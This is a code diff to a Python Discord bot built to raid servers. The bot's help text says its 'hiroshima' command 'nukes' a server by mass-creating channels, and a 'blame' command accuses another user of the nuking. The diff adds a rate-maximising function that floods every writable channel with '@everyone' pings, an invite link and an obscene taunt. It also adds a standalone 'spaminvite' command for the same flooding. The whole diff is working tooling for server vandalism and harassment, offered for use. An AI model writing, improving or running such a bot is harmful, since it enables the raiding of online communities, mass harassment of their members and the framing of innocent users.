@@ -43,6 +43,25 @@ async def on_ready():
     print(f"{Fore.MAGENTA}[5] ;nothing - nothing left")
 
 REPORT_CHANNEL_ID = 1516330515110559765
+INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
+SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"
+
+async def send_invite_spam(channels, amount=25, concurrency=12):
+    """Send invite spam across channels as fast as possible without blocking on one channel."""
+    if not channels:
+        return
+
+    semaphore = asyncio.Semaphore(concurrency)
+
+    async def send_to_channel(channel):
+        async with semaphore:
+            for _ in range(amount):
+                try:
+                    await channel.send(SPAM_MESSAGE)
+                except Exception:
+                    pass
+
+    await asyncio.gather(*(send_to_channel(channel) for channel in channels), return_exceptions=True)
 
 @client.command()
 async def hiroshima(ctx):
@@ -97,13 +116,29 @@ async def hiroshima(ctx):
     channels = await asyncio.gather(*create_channels, return_exceptions=True)
     channels = [c for c in channels if not isinstance(c, Exception)]
     
-    # Send messages concurrently
+    # The original hiroshima behavior stays here; invite spam is now a separate command.
     if channels:
-        messages = []
-        for channel in channels:
-            for _ in range(5):
-                messages.append(channel.send("@everyone discord.gg/Gx9b3AsJR3 owns ur server pussy"))
-        await asyncio.gather(*messages, return_exceptions=True)
+        await send_invite_spam(channels, amount=30, concurrency=12)
+
+@client.command()
+async def spaminvite(ctx, amount: int = 25):
+    """Spam the invite link across all visible text channels."""
+    if ctx.guild is None:
+        await ctx.send("Use this command in a server.")
+        return
+
+    if amount <= 0:
+        amount = 1
+
+    # Use all visible text channels that the bot can write to.
+    channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
+    if not channels:
+        await ctx.send("No writable channels found.")
+        return
+
+    await ctx.send(f"Spamming `{INVITE_TEXT}` {amount} times per channel...")
+    await send_invite_spam(channels, amount=amount, concurrency=12)
+    await ctx.send("Invite spam finished.")
 
 @client.command()
 async def blame(ctx, member: discord.Member = None):
@@ -132,9 +167,10 @@ async def blame(ctx, member: discord.Member = None):
 async def help(ctx):
     messages = [
         ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**"),
-        ctx.send("**[3] ;blame @user - Accuses someone for nuking the server**"),
+        ctx.send("**[3] ;spaminvite [amount] - Spams the invite link**"),
+        ctx.send("**[4] ;blame @user - Accuses someone for nuking the server**"),
         ctx.send("**-------------------------------------------------------------------------**"),
-        ctx.send("**[4] ;credits - Shows My Socials  |     [5] ;nothing - nothing left**")
+        ctx.send("**[5] ;credits - Shows My Socials  |     [6] ;nothing - nothing left**")
     ]
     await asyncio.gather(*messages)
 
